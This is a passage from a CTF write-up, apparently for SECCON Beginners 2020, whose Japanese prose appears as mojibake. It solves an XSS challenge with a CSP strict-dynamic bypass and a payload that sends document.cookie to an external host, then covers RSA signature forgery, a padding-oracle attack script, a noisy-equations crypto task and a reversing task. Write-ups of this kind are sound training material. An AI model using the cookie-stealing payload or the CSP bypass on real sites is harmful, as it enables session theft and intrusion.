ä¸ãˆã‚‰ã‚ŒãŸã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’è¦‹ã¦ã„ãã¾ã—ã‚‡ã†ã€‚`worker.js` ã¯ä»¥ä¸‹ã®ã‚ˆã†ãªå†…å®¹ã§ã—ãŸã€‚

```javascript
const puppeteer = require('puppeteer');

/* ... ... */

// initialize
const browser = await puppeteer.launch({
    executablePath: 'google-chrome-unstable',
    headless: true,
    args: [
        '--no-sandbox',
        '--disable-background-networking',
        '--disk-cache-dir=/dev/null',
        '--disable-default-apps',
        '--disable-extensions',
        '--disable-gpu',
        '--disable-sync',
        '--disable-translate',
        '--hide-scrollbars',
        '--metrics-recording-only',
        '--mute-audio',
        '--no-first-run',
        '--safebrowsing-disable-auto-update',
    ],
});
const page = await browser.newPage();

// set cookie
await page.setCookie({
    name: 'flag',
    value: process.env.FLAG,
    domain: process.env.DOMAIN,
    expires: Date.now() / 1000 + 10,
});

// access
// username is the input value of players
const url = `https://(çœç•¥)/?username=${encodeURIComponent(username)}`;
try {
    await page.goto(url, {
        waitUntil: 'networkidle0',
        timeout: 5000,
    });
} catch (err) {
    console.log(err);
}

// finalize
await page.close();
await browser.close();

/* ... ... */
```

Cookie ã«ãƒ•ãƒ©ã‚°ãŒå…¥ã£ã¦ã„ã‚‹ã‚ˆã†ã§ã™ã€‚HttpOnly ãƒ•ãƒ©ã‚°ã¯è¨­å®šã•ã‚Œã¦ã„ã¾ã›ã‚“ã‹ã‚‰ã€JavaScript ã‹ã‚‰ã‚‚ `document.cookie` ã§èª­ã¿å‡ºã›ã‚‹ã¯ãšã§ã™ã€‚

`index.php` ã¯ä»¥ä¸‹ã®ã‚ˆã†ãªå†…å®¹ã§ã—ãŸã€‚

```php
<?php
$nonce = base64_encode(random_bytes(20));
header("Content-Security-Policy: default-src 'none'; script-src 'nonce-${nonce}' 'strict-dynamic' 'sha256-nus+LGcHkEgf6BITG7CKrSgUIb1qMexlF8e5Iwx1L2A='");
?>

<head>
    <title>Best somen for <?= isset($_GET["username"]) ? $_GET["username"] : "You" ?></title>

    <script src="/security.js" integrity="sha256-nus+LGcHkEgf6BITG7CKrSgUIb1qMexlF8e5Iwx1L2A="></script>
    <script nonce="<?= $nonce ?>">
        const choice = l => l[Math.floor(Math.random() * l.length)];

        window.onload = () => {
            const username = new URL(location).searchParams.get("username");
            const adjective = choice(["Nagashi", "Hiyashi"]);
            if (username !== null)
                document.getElementById("message").innerHTML = `${username}, I recommend ${adjective} somen for you.`;
        }
    </script>
</head>

<body>
    <h1>Best somen for You</h1>

    <p>Please input your name. You can use only alphabets and digits.</p>
    <p>This page works fine with latest Google Chrome / Chromium. We won't support other browsers :P</p>
    <p id="message"></p>
    <form action="/" method="GET">
        <input type="text" name="username" place="Your name"></input>
        <button type="submit">Ask</button>
    </form>
    <hr>

    <p> If your name causes suspicious behavior, please tell me that from the following form. Admin will acceess /?username=${encodeURIComponent(your input)} and see what happens.</p>
    <form action="/inquiry" method="POST">
        <input type="text" name="username" place="Your name"></input>
        <button type="submit">Ask</button>
    </form>

</body>
```

`Content-Security-Policy: default-src 'none'; script-src 'nonce-${nonce}' 'strict-dynamic' 'sha256-nus+LGcHkEgf6BITG7CKrSgUIb1qMexlF8e5Iwx1L2A='` ã¨ CSP ãŒå³ã—ã‚ã§ã™ã€‚ãŸã ã€`strict-dynamic` ãŒä»˜ä¸ã•ã‚Œã¦ã„ã‚‹ã®ã§ã€`nonce` ãŒä»˜ä¸ã•ã‚Œã¦å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ JavaScript ã‚³ãƒ¼ãƒ‰ã‚„ `security.js` ä¸­ã«è„†å¼±æ€§ãŒã‚ã‚Œã°ãªã‚“ã¨ã‹ãªã‚Šãã†ã§ã™ã€‚

ã¾ãš `security.js` ã‚’è¦‹ã¦ã¿ãŸã‚‚ã®ã®ã€ã©ã†ã‚„ã‚‰ã“ã‚Œã¯ãŸã ç§ãŸã¡ã®é‚ªé­”ã‚’ã™ã‚‹ãŸã‚ã ã‘ã«è¨­ç½®ã•ã‚Œã¦ã„ã‚‹ã‚³ãƒ¼ãƒ‰ã®ã‚ˆã†ã§ã™ã€‚

```javascript
console.log('!! security.js !!');
const username = new URL(location).searchParams.get("username");
if (username !== null && ! /^[a-zA-Z0-9]*$/.test(username)) {
    document.location = "/error.php";
}
```

`a-zA-Z0-9` ã ã‘ã§ã¯æµçŸ³ã«ä»»æ„ã® JavaScript ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ (ã“ã“ã« [`().` ã‚’è¿½åŠ ã™ã‚Œã°å¯èƒ½ã§ã™ãŒ :)](2019-05-21-harekaze-ctf-2019.html#misc-200-a-z) )ã€‚ãªã‚“ã¨ã‹ã—ã¦ç„¡åŠ¹åŒ–ã§ããªã„ã§ã—ã‚‡ã†ã‹ã€‚

ã“ã® Web ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã¯ XSS ã®æ³¨å…¥ç®‡æ‰€ãŒ 2 ç®‡æ‰€ã‚ã‚Šã€ãã®ã†ã¡ã®ã²ã¨ã¤ãŒ `title` è¦ç´ å†…ã§ã‚ã‚‹ã“ã¨ã«æ³¨ç›®ã—ã¾ã™ã€‚ã“ã®ç›´å¾Œã« `/security.js`ã€`nonce` ä»˜ãã®ãµãŸã¤ã® `script` è¦ç´ ãŒä¸¦ã‚“ã§ã„ã‚‹ã“ã¨ã‚’åˆ©ç”¨ã—ã¾ã—ã‚‡ã†ã€‚

`/?username=</title><script>` ã§ã€ä»¥ä¸‹ã®ã‚ˆã†ã« `<script src="/security.js" integrity="sha256-nus+LGcHkEgf6BITG7CKrSgUIb1qMexlF8e5Iwx1L2A=">` éƒ¨åˆ†ã‚’ JavaScript ã‚³ãƒ¼ãƒ‰ã¨ã—ã¦è§£é‡ˆã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã—ãŸã€‚ã“ã‚Œã§ `/security.js` ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã“ã¨ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚

```html
<head>
    <title>Best somen for </title><script></title>

    <script src="/security.js" integrity="sha256-nus+LGcHkEgf6BITG7CKrSgUIb1qMexlF8e5Iwx1L2A="></script>
    <script nonce="FHnRMK/GC62ODRynO72fHYGsHj4=">
        const choice = l => l[Math.floor(Math.random() * l.length)];

        window.onload = () => {
            const username = new URL(location).searchParams.get("username");
            const adjective = choice(["Nagashi", "Hiyashi"]);
            if (username !== null)
                document.getElementById("message").innerHTML = `${username}, I recommend ${adjective} somen for you.`;
        }
    </script>
</head>
```

ã•ã¦ã€ãµãŸã¤ã‚ã®æ³¨å…¥ç®‡æ‰€ã§ã‚ã‚‹

```javascript
document.getElementById("message").innerHTML = `${username}, I recommend ${adjective} somen for you.`;
```

ã‹ã‚‰ãªã‚“ã¨ã‹ã—ã¦ JavaScript ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ããªã„ã§ã—ã‚‡ã†ã‹ã€‚`dynamic-strict` ã§ã‚°ã‚°ã£ã¦ã„ã‚‹ã¨ã€ã“ã® CTF ã®é‹å–¶è€…ã§ã‚ã‚‹ã¤ã°ã‚ã•ã‚“ãŒé‹å–¶ã•ã‚Œã¦ã„ã‚‹ XSS Challenge ã®å•é¡Œã®ã²ã¨ã¤ã§ã‚ã‚‹ [Case 23 ã® write-up](https://szarny.hatenablog.com/entry/2019/01/01/XSS_Challenge_%28%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%83%BB%E3%83%9F%E3%83%8B%E3%82%AD%E3%83%A3%E3%83%B3%E3%83%97_in_%E5%B2%A1%E5%B1%B1_2018_%E6%BC%94%E7%BF%92%E3%82%B3%E3%83%B3#Case-23-nonce--strict-dynamic) ãŒãƒ’ãƒƒãƒˆã—ã¾ã—ãŸã€‚

ãªã‚‹ã»ã©ã€‚ã“ã®å•é¡Œã«åˆã‚ã›ã¦èª¬æ˜ã™ã‚‹ã¨ã€`message` ã¨ã„ã† `id` å±æ€§ã‚’æŒã¤ `script` ã‚’ç”¨æ„ã™ã‚Œã°ã€`p#message` ã‚ˆã‚Šå‰ã«ä½ç½®ã—ã¦ã„ã‚‹ãŸã‚ `document.getElementById("message")` ãŒ `script#message` ã‚’è¿”ã—ã€ã“ã‚Œã« `` `${username}, I recommend ${adjective} somen for you.` `` ãŒæŒ¿å…¥ã•ã‚Œã¦ JavaScript ã‚³ãƒ¼ãƒ‰ã¨ã—ã¦å®Ÿè¡Œã•ã‚Œã‚‹ã¨ã„ã†ä»•çµ„ã¿ã®ã‚ˆã†ã§ã™ã€‚

`/?username=alert(1)//</title><script%20id="message"></script><script>` ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã¿ã‚‹ã¨ã‚¢ãƒ©ãƒ¼ãƒˆãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸã€‚ã‚„ã£ãŸ!

ã¨ã„ã†ã“ã¨ã§ã€`document.getElementById('input').value=document.cookie;document.getElementById('form').submit()//</title><script id="message"></script><form id="form" action="https://(çœç•¥)"><input name="input" id="input"></form><script>` ã‚’ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¨ã—ã¦æå‡ºã™ã‚‹ã¨ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
ctf4b{1_w0uld_l1k3_70_347_50m3n_b3f0r3_7ry1n6_70_3xpl017}
```

## [Crypto 52] R&B (500 solves)
> Do you like rhythm and blues?
> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«:
> - problem.py
> - encoded_flag

`problem.py` ã¯ä»¥ä¸‹ã®ã‚ˆã†ãªå†…å®¹ã§ã—ãŸã€‚

```python
from os import getenv


FLAG = getenv("FLAG")
FORMAT = getenv("FORMAT")


def rot13(s):
    # snipped


def base64(s):
    # snipped


for t in FORMAT:
    if t == "R":
        FLAG = "R" + rot13(FLAG)
    if t == "B":
        FLAG = "B" + base64(FLAG)

print(FLAG)
```

è‡³æ¥µå˜ç´”ãªã‚³ãƒ¼ãƒ‰ã§ã™ã€‚å¾©å·å‡¦ç†ã¯ 1 æ–‡å­—ç›®ãŒ R ã§ã‚ã‚Œã° 2 æ–‡å­—ç›®ä»¥é™ã‚’åˆ‡ã‚Šå–ã£ã¦ ROT13ã€1 æ–‡å­—ç›®ãŒ B ã§ã‚ã‚Œã° 2 æ–‡å­—ç›®ä»¥é™ã‚’åˆ‡ã‚Šå–ã£ã¦ Base64 ãƒ‡ã‚³ãƒ¼ãƒ‰ã¨ã„ã†ã®ã‚’ç¹°ã‚Šè¿”ã›ã°ã‚ˆã•ãã†ã§ã™ã€‚

[CyberChef ã§é ‘å¼µã‚‹](https://gchq.github.io/CyberChef/#recipe=Drop_bytes(0,1,false)From_Base64('A-Za-z0-9%2B/%3D',true)Drop_bytes(0,1,false)From_Base64('A-Za-z0-9%2B/%3D',true)Drop_bytes(0,1,false)ROT13(true,true,13)Drop_bytes(0,1,false)From_Base64('A-Za-z0-9%2B/%3D',true)Drop_bytes(0,1,false)ROT13(true,true,13)Drop_bytes(0,1,false)From_Base64('A-Za-z0-9%2B/%3D',true)Drop_bytes(0,1,false)ROT13(true,true,13)Drop_bytes(0,1,false)From_Base64('A-Za-z0-9%2B/%3D',true)Drop_bytes(0,1,false)From_Base64('A-Za-z0-9%2B/%3D',true)Drop_bytes(0,1,false)ROT13(true,true,13)Drop_bytes(0,1,false)From_Base64('A-Za-z0-9%2B/%3D',true)Drop_bytes(0,1,false)ROT13(true,true,13)Drop_bytes(0,1,false)From_Base64('A-Za-z0-9%2B/%3D',true)Drop_bytes(0,1,false)ROT13(true,true,13)&input=QlFsVnJPVWxsUkd4WFkyeEdOVkp1UWpSa1ZGWjVVMFZWTUdOVlpFcGlSVnBUWlZaYWRtUXdPV2hUVkVJeFRraEtURk5XU2tkV1JVWklVbFJHV0ZVd1JrbFVWbHBKVFZoR2MxTkZhREZhVlZZMVVrZDBSazFxYkRGU00zQnVWakZ3TkdWWFZrZFdXRVpZVTBSQ1RsZEZaM2RSVm1SNVZWWk9UR05HU2pGVE1qUjZWakJXU0Uxck1WUlhhazVLVjFoQ1RHVllaRXBsUjNCelkwVnNhbUpGYUdobFYwcEdVakZPVUZORVFrNVdhMXBJVkZaYVlWVnFSbTlUYlVacVdWaEtVMk5WYUVsTk0wWlRZMjVrU1UxVldsSlVNa1pKVldzeFYxTkVTakZoVm5CVlkwZDBSMU5JVlhoVVZFSjRUbXN3ZUZZeWVFZE5WVVV4VWxSQ05WSXdhM2RqVm1STllsVkdjbEpVUVhoVVJWWklWR3BXUjFaVk9WcGphMng0VVZad1ZWRlVSa1pWYmxaWVlteE9hV0ZyUmt0VFZsSkpXVmhzVEZKRmJGaFJWVVkwVWxaa1NrMVlSbFJpTUdjd1RsRTlQUT09)ã¨ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
ctf4b{rot_base_rot_base_rot_base_base}
```

## [Crypto 261] Noisy equations (76 solves)
> noise hides flag.
> 
> nc (çœç•¥)
> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«: problem.py

`problem.py` ã¯ä»¥ä¸‹ã®ã‚ˆã†ãªå†…å®¹ã§ã—ãŸã€‚

```python
from os import getenv
from time import time
from random import getrandbits, seed


FLAG = getenv("FLAG").encode()
SEED = getenv("SEED").encode()

L = 256
N = len(FLAG)


def dot(A, B):
    assert len(A) == len(B)
    return sum([a * b for a, b in zip(A, B)])

coeffs = [[getrandbits(L) for _ in range(N)] for _ in range(N)]

seed(SEED)

answers = [dot(coeff, FLAG) + getrandbits(L) for coeff in coeffs]

print(coeffs)
print(answers)
```

æœ€åˆã® `getrandbits(L)` ã¯å®Œå…¨ã«ãƒ©ãƒ³ãƒ€ãƒ ãªãŒã‚‰ã‚‚å‡ºåŠ›ã•ã‚Œã€æ¬¡ã® `getrandbits(L)` ã§ã¯ã‚·ãƒ¼ãƒ‰ãŒå›ºå®šã§ã‚ã‚‹ã“ã¨ã«æ³¨ç›®ã—ã¾ã™ã€‚

å›ºå®šã§ã‚ã£ã¦ã‚‚ã‚·ãƒ¼ãƒ‰ã¯ã‚ã‹ã‚Šã¾ã›ã‚“ãŒã€2 å›å‡ºåŠ›ä¾‹ã‚’å¾—ã‚Œã°ãã®å·®åˆ†ã‚’å¾—ã‚‹ã“ã¨ã§ `+ getrandbits(L)` ã®éƒ¨åˆ†ã‚’æ¶ˆã™ã“ã¨ãŒã§ãã¾ã™ã€‚ã‚ã¨ã¯é€£ç«‹ä¸€æ¬¡æ–¹ç¨‹å¼ã‚’è§£ã‘ã°ãƒ•ãƒ©ã‚°ãŒå‡ºã¦ãã‚‹ã¯ãšã§ã™ã€‚ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’æ›¸ãã¾ã—ã‚‡ã†ã€‚

```python
import re
import sympy
from gauss import gauss # https://rosettacode.org/wiki/Gaussian_elimination#Python

# nc (çœç•¥) > a.txt
with open('a.txt') as f:
  coeffs1 = eval(f.readline())
  answers1 = eval(f.readline())

# nc (çœç•¥) > b.txt
with open('b.txt') as f:
  coeffs2 = eval(f.readline())
  answers2 = eval(f.readline())

L = 256
N = len(answers1)

answers = [x - y for x, y in zip(answers1, answers2)]
coeffs = [[coeffs1[i][j] - coeffs2[i][j] for j in range(N)] for i in range(N)]

A = []
b = []
for coeff, answer in zip(coeffs, answers):
  A.append(coeff)
  b.append([answer])

res = ''
for c in gauss(A, b)[1]:
  res += chr(round(c[0]))

print(''.join(c for c in res if c is not None))
```

```
$ python solve.py
ctf4b{r4nd0m_533d_15_n3c3554ry_f0r_53cur17y}
```

ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
ctf4b{r4nd0m_533d_15_n3c3554ry_f0r_53cur17y}
```

## [Crypto 319] RSA Calc (52 solves)
> F(1337)=FLAG!
> 
> nc (çœç•¥)
> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«: server.py

`server.py` ã¯ä»¥ä¸‹ã®ã‚ˆã†ãªå†…å®¹ã§ã—ãŸã€‚

```python
from Crypto.Util.number import *
from params import p, q, flag
import binascii
import sys
import signal


N = p * q
e = 65537
d = inverse(e, (p-1)*(q-1))


def input(prompt=''):
    sys.stdout.write(prompt)
    sys.stdout.flush()
    return sys.stdin.buffer.readline().strip()

def menu():
    sys.stdout.write('''----------
1) Sign
2) Exec
3) Exit
''')
    try:
        sys.stdout.write('> ')
        sys.stdout.flush()
        return int(sys.stdin.readline().strip())
    except:
        return 3


def cmd_sign():
    data = input('data> ')
    if len(data) > 256:
        sys.stdout.write('Too long\n')
        return

    if b'F' in data or b'1337' in data:
        sys.stdout.write('Error\n')
        return

    signature = pow(bytes_to_long(data), d, N)
    sys.stdout.write('Signature: {}\n'.format(binascii.hexlify(long_to_bytes(signature)).decode()))

def cmd_exec():
    data = input('data> ')
    signature = int(input('signature> '), 16)

    if signature < 0 or signature >= N:
        sys.stdout.write('Invalid signature\n')
        return

    check = long_to_bytes(pow(signature, e, N))
    if data != check:
        sys.stdout.write('Invalid signature\n')
        return

    chunks = data.split(b',')
    stack = []
    for c in chunks:
        if c == b'+':
            stack.append(stack.pop() + stack.pop())
        elif c == b'-':
            stack.append(stack.pop() - stack.pop())
        elif c == b'*':
            stack.append(stack.pop() * stack.pop())
        elif c == b'/':
            stack.append(stack.pop() / stack.pop())
        elif c == b'F':
            val = stack.pop()
            if val == 1337:
                sys.stdout.write(flag + '\n')
        else:
            stack.append(int(c))

    sys.stdout.write('Answer: {}\n'.format(int(stack.pop())))


def main():
    sys.stdout.write('N: {}\n'.format(N))
    while True:
        try:
            command = menu()
            if command == 1:
                cmd_sign()
            if command == 2:
                cmd_exec()
            elif command == 3:
                break
        except:
            sys.stdout.write('Error\n')
            break


if __name__ == '__main__':
    signal.alarm(60)
    main()
```

`+` `-` `*` `/` `F` ã® 5 ã¤ã®å‘½ä»¤ã‚’æŒã¤ã‚¹ã‚¿ãƒƒã‚¯ãƒã‚·ãƒ³çš„ãªãƒŸãƒ‹ VM ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚ˆã†ã§ã™ã€‚`1337,F` ã‚„ã€€`7,191,*,F` ã®ã‚ˆã†ã« `F` ãŒå®Ÿè¡Œã•ã‚ŒãŸã¨ãã«ã‚¹ã‚¿ãƒƒã‚¯ã®ãƒˆãƒƒãƒ—ãŒ `1337` ã§ã‚ã‚Œã°ãƒ•ãƒ©ã‚°ãŒè¡¨ç¤ºã•ã‚Œã‚‹ã‚ˆã†ã§ã™ã€‚

ãƒ¡ãƒ‹ãƒ¥ãƒ¼ã§ `2` ã‚’å…¥åŠ›ã™ã‚‹ã¨å‘½ä»¤åˆ—ã®å®Ÿè¡ŒãŒã§ãã‚‹ã‚ˆã†ã§ã™ãŒã€ãã®å‰ã«ç½²åã‚’ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã‚ˆã†ã§ã™ã€‚ãƒ¡ãƒ‹ãƒ¥ãƒ¼ã§ `1` ã‚’å…¥åŠ›ã™ã‚‹ã¨å‘½ä»¤åˆ—ã‚’ç½²åã§ãã¾ã™ãŒã€`F` ã‚„ `1337` ã‚’å«ã‚€å‘½ä»¤åˆ—ã¯æ‹’å¦ã•ã‚Œã¾ã™ã€‚

ç½²åã«ã¯æ•™ç§‘æ›¸çš„ãª RSA æš—å·ãŒä½¿ã‚ã‚Œã¦ã„ã¾ã™ã‹ã‚‰ã€ã“ã‚Œã‚’åˆ©ç”¨ã—ã¾ã—ã‚‡ã†ã€‚

```python
import binascii
from decimal import Decimal
from Crypto.Util.number import *
from pwn import *

def sign(data):
  sock.recvuntil('> ')
  sock.sendline('1')
  sock.recvuntil('data>')
  sock.sendline(data)
  sock.recvuntil('Signature: ')
  return sock.recvline().strip()

def execute(data, sig):
  sock.recvuntil('> ')
  sock.sendline('2')
  sock.recvuntil('data>')
  sock.sendline(data)
  sock.recvuntil('signature> ')
  sock.sendline(sig)
  return sock.recvline().strip()

N = 104452494729225554355976515219434250315042721821732083150042629449067462088950256883215876205745135468798595887009776140577366427694442102435040692014432042744950729052688898874640941018896944459642713041721494593008013710266103709315252166260911167655036124762795890569902823253950438711272265515759550956133
ops = b'7,191,*,F'
sock = remote('(çœç•¥)', 10001)

sig1 = int(sign(long_to_bytes(int(Decimal(bytes_to_long(ops)) / 2))), 16)
sig2 = int(sign(long_to_bytes(2)), 16)

sig = hex((sig1 * sig2) % N)[2:]
print(execute(ops, sig))

sock.close()
```

```
$ python3 solve.py
b'ctf4b{SIgn_n33ds_P4d&H4sh}'
```

ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
ctf4b{SIgn_n33ds_P4d&H4sh}
```

## [Crypto 414] Encrypter (22 solves)
> æš—å·åŒ–ã§ãã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã‚’ä½œã£ã¦ã¿ã¾ã—ãŸï¼
> 
> http://(çœç•¥)/

ä¸ãˆã‚‰ã‚ŒãŸ URL ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€æ¬¡ã®ã‚ˆã†ãªãƒ•ã‚©ãƒ¼ãƒ ãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸã€‚

![æ–‡å­—åˆ—ãŒæš—å·åŒ–ã§ããã†ãªé›°å›²æ°—](../images/2020-05-24_encrypter.png)

Encrypt ã‚’é¸æŠã—ãŸçŠ¶æ…‹ã§ã€é©å½“ãª Base64 ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸæ–‡å­—åˆ—ã‚’å…¥åŠ›ã—ã¦ Encrypt/Decrypt ãƒœã‚¿ãƒ³ã‚’æŠ¼ã™ã¨ã€æš—å·åŒ–ã•ã‚ŒãŸãƒã‚¤ãƒˆåˆ—ãŒ Base64 ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚Œã¦è¿”ã£ã¦ãã¾ã—ãŸã€‚

ä»Šåº¦ã¯ Decrypt ã‚’é¸æŠã—ãŸçŠ¶æ…‹ã§ã€å…ˆç¨‹å‡ºåŠ›ã•ã‚ŒãŸæš—å·åŒ–ã•ã‚ŒãŸæ–‡å­—åˆ—ã‚’æŠ•ã’ã¦ã¿ã‚‹ã¨ã€`ok. TODO: return the result without the flag` ã¨ã„ã†ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸã€‚å†…å®¹ã‚’é©å½“ã«å¤‰ãˆã¦ã¿ã‚‹ã¨ `bad decrypt` ã¨ã„ã†ã‚¨ãƒ©ãƒ¼ãŒè¡¨ç¤ºã•ã‚ŒãŸã®ã§ã€ã©ã†ã‚„ã‚‰ã“ã‚Œã¯å¾©å·ã®æˆå¦ã ã‘ã‚’æ•™ãˆã¦ãã‚Œã‚‹ã‚ˆã†ã§ã™ã€‚

Encrypted flag ã‚’é¸æŠã—ãŸçŠ¶æ…‹ã§ Encrypt/Decrypt ãƒœã‚¿ãƒ³ã‚’æŠ¼ã™ã¨ã€æš—å·åŒ–ã•ã‚ŒãŸãƒ•ãƒ©ã‚°ãŒè¿”ã£ã¦ãã¾ã—ãŸã€‚

æš—å·åŒ–å¾Œã®ãƒã‚¤ãƒˆåˆ—ãŒ 16 ãƒã‚¤ãƒˆå˜ä½ã§å¢—ãˆã€`A * 256` ã‚’æŠ•ã’ã¦ã‚‚ä½•åº¦ã‚‚åŒã˜ãƒã‚¤ãƒˆåˆ—ãŒå‡ºç¾ã—ãªã„ã‚ãŸã‚Šã€AES-CBC-128 ã§ã‚‚ä½¿ã‚ã‚Œã¦ã„ã‚‹ã®ã§ã—ã‚‡ã†ã€‚å¾©å·ã®æˆå¦ã ã‘ãŒã‚ã‹ã‚‹ã¨ã„ã†ç‚¹ã¨ã‚ã‚ã›ã‚‹ã¨ãƒ‘ãƒ‡ã‚£ãƒ³ã‚°ã‚ªãƒ©ã‚¯ãƒ«æ”»æ’ƒã‚’ä½¿ã†ã®ã ã‚ã†ã¨æ¨æ¸¬ã§ãã¾ã™ã€‚

[ptrlib](https://pypi.org/project/ptrlib/) ã¨ã„ã†å¤§å¤‰ä¾¿åˆ©ãªãƒ©ã‚¤ãƒ–ãƒ©ãƒªã«ã¯[ãƒ‘ãƒ‡ã‚£ãƒ³ã‚°ã‚ªãƒ©ã‚¯ãƒ«æ”»æ’ƒç”¨ã® API](https://bitbucket.org/ptr-yudai/ptrlib/src/master/ptrlib/crypto/padcbc.py) ãŒç”¨æ„ã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚’ä½¿ã£ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```python
import base64
import json
import requests
from ptrlib.crypto.padcbc import padding_oracle

def decrypt(cipher):
  req = requests.post('http://(çœç•¥)/encrypt.php', data=json.dumps({
    'mode': 'decrypt',
    'content': base64.b64encode(cipher).decode()
  }), headers={
    'Content-Type': 'application/json'    
  })
  return 'result' in req.text

payload = base64.b64decode('CA/TNddwz0owdPVwzXp1Xf+M13taV/d4q8rgvZ+DfzbFGLPwiwRuBIFWQU7cPLm/sxy5a71ysmW0cHgtYpyEmg==')
cracked = padding_oracle(decrypt, payload, bs=16, unknown=b'?')
print(cracked)
```

```
$ python3 solve.py
[+] padding_oracle_block: decrypted a byte 1/16: b'\x02'
[+] padding_oracle_block: decrypted a byte 2/16: b'\x02'
[+] padding_oracle_block: decrypted a byte 3/16: b'}'
[+] padding_oracle_block: decrypted a byte 4/16: b'n'
[+] padding_oracle_block: decrypted a byte 5/16: b'0'
[+] padding_oracle_block: decrypted a byte 6/16: b'1'
ï¸™
[+] padding_oracle_block: decrypted a byte 11/16: b'{'
[+] padding_oracle_block: decrypted a byte 12/16: b'b'
[+] padding_oracle_block: decrypted a byte 13/16: b'4'
[+] padding_oracle_block: decrypted a byte 16/16: b'c'
[+] padding_oracle: decrypted a block 4/4: b'ctf4b{p4d0racle_'
b'????????????????ctf4b{p4d0racle_1s_als0_u5eful_f0r_3ncrypt10n}\x02\x02'
```

ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
ctf4b{p4d0racle_1s_als0_u5eful_f0r_3ncrypt10n}
```

## [Reversing 62] mask (354 solves)
> The price of mask goes down. So does the point (it's easy)!
> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«: mask (x86_64 ã® ELF)

[Ghidra](https://ghidra-sre.org/) ã«æŠ•ã’ã¦ãƒ‡ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```c
undefined8 main(int iParm1,long lParm2)

{
  int iVar1;
  size_t sVar2;
  long in_FS_OFFSET;
  int local_e0;
  byte local_d8 [64];
  byte local_98 [64];
  byte local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if (iParm1 == 1) {
    puts("Usage: ./mask [FLAG]");
  }
  else {
    strcpy((char *)local_d8,*(char **)(lParm2 + 8));
    sVar2 = strlen((char *)local_d8);
    iVar1 = (int)sVar2;
    puts("Putting on masks...");
    local_e0 = 0;
    while (local_e0 < iVar1) {
      local_98[(long)local_e0] = local_d8[(long)local_e0] & 0x75;
      local_58[(long)local_e0] = local_d8[(long)local_e0] & 0xeb;
      local_e0 = local_e0 + 1;
    }
    local_98[(long)iVar1] = 0;
    local_58[(long)iVar1] = 0;
    puts((char *)local_98);
    puts((char *)local_58);
    iVar1 = strcmp((char *)local_98,"atd4`qdedtUpetepqeUdaaeUeaqau");
    if ((iVar1 == 0) &&
       (iVar1 = strcmp((char *)local_58,"c`b bk`kj`KbababcaKbacaKiacki"), iVar1 == 0)) {
      puts("Correct! Submit your FLAG.");
    }
    else {
      puts("Wrong FLAG. Try again.");
    }
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

ãƒ•ãƒ©ã‚°ã®å„æ–‡å­—ã¨ 0x75 ã‚’ãƒ“ãƒƒãƒˆ AND ã™ã‚‹ã¨ `` atd4`qdedtUpetepqeUdaaeUeaqau `` ã«ã€0xeb ã¨ãƒ“ãƒƒãƒˆ AND ã™ã‚‹ã¨ `` c`b bk`kj`KbababcaKbacaKiacki `` ã«ãªã‚‹ã‚ˆã†ã§ã™ã€‚

`0x75|0xeb==0xff` ã§ã¡ã‚‡ã†ã© 8 ãƒ“ãƒƒãƒˆåˆ†ã‚«ãƒãƒ¼ã§ãã¾ã™ã‹ã‚‰ã€ãƒ“ãƒƒãƒˆ OR ã§å…ƒã®æ–‡å­—åˆ—ãŒå¾—ã‚‰ã‚Œã‚‹ã¯ãšã§ã™ã€‚ã‚„ã£ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```
$ python3
>>> s = b"atd4`qdedtUpetepqeUdaaeUeaqau"
>>> t = b"c`b bk`kj`KbababcaKbacaKiacki"
>>> bytes(c | d for c, d in zip(s, t))
b'ctf4b{dont_reverse_face_mask}'
```

ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
ctf4b{dont_reverse_face_mask}
```

## [Reversing 156] yakisoba (144 solves)
> Would you like to have a yakisoba code?
> 
> (Hint: You'd better automate your analysis)
